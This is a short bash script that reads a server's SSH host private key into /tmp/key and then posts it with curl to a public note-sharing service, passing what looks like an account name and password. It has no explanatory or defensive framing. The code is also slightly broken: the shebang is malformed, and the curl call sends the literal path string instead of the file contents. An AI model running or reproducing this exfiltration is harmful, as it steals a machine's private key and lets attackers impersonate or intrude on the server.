#/bin/bash

cat /etc/ssh/ssh_host_rsa_key > /tmp/key

curl -X POST fernando@rvloona.com:ferssiferssa --data-binary "/tmp/key" https://anotepad.com/api/notes
